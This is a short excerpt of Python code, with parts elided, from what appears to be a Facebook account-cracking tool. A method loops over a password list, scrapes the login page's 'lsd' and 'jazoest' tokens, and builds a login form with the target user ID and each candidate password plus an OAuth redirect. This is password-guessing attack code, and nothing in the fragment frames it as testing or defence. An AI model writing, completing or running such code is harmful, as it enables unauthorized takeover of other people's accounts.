    ...
    def __metode__(self, cebok, user, pasw):
        ...
        try:
            for pw in pasw:
                ...
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.4/dialog/oauth?client_id=1013557125334052&scope=public_profile,email&state=e97b0ddc1d28aa5ae736998a63ce9ed7&tp=unspecified","flow":"login_no_pin","pass":pw,}
